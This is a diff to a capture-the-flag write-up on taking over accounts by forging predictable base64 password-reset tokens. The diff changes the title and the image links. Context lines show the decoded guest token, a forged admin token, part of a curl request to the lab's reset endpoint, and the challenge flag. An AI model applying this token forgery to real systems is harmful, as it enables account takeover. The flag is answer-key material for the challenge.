@@ -1,4 +1,4 @@
-# The Forgotten Reset: Account Takeover via Deterministic Token Forgery
+# Meridian Password Reset: Account Takeover via Deterministic Token Forgery
 
 | Parameter | Details |
 | :--- | :--- |
@@ -74,7 +74,7 @@ echo "TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=" | base64 -d
 # Output: MERIDIAN-guest-20261010
 ```
 
-![Token Decode](assets/token_decode.png)
+![Guest Token](images/guest-token.png)
 
 Analysis confirmed the token parameters:
 * Static Prefix: `MERIDIAN-`
@@ -94,6 +94,8 @@ FORGED_TOKEN=$(echo -n "$RAW_TOKEN" | base64)
 echo "Forged Token: $FORGED_TOKEN"
 # Result: TUVSSURJQU4tYmVuZWZpdHMtYWRtaW4tMjAyNjEwMTA=
 ```
+
+![Admin Token](images/admin-token.png)
 
 ### Step 4: Account Takeover (ATO)
 
@@ -122,7 +124,7 @@ curl -s -X POST "https://web2.cybernexus.live/reset?token=${FORGED_TOKEN}" \
    echo "VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=" | base64 -d
    ```
 
-![Flag Decode](assets/flag_decode.png)
+![Recovered Flag](images/recovered-flag.png)
 
 **Final Flag:** `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}`
 
